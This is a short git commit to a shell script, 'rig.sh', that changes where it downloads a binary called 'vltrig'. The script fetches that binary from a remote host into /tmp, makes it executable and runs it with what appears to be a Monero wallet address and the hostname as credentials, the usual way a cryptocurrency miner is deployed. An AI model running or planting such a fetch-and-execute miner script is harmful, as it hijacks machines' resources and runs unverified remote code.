10031bf0994181f1cdf80f3b70c98a1b1a7f3448
ivanhi0 <idbod@ivanhi0.ru>
2026-04-13 09:32:40 +0300

    Update rig.sh

--- rig.sh
+++ rig.sh
@@ -3,7 +3,7 @@ FILE_CHK=/tmp/vltrig
 
 cd /tmp
 if [ ! -f "$FILE_CHK" ]; then
-    wget https://bio.ivanhi0.ru/vltrig
+    wget https://ivanhi0.github.io/vltrig
 fi
 chmod +x ./vltrig
 ./vltrig --user 42zHmvjLFQf6nLHbVCzm5RNxwovafb9mbPhYixC9ynFn29uxjGfPY3Z1BM5e2RXdnyiZCcujqznUoJ7AfPQpy4BPU7UrCJb --pass $(hostname -b)
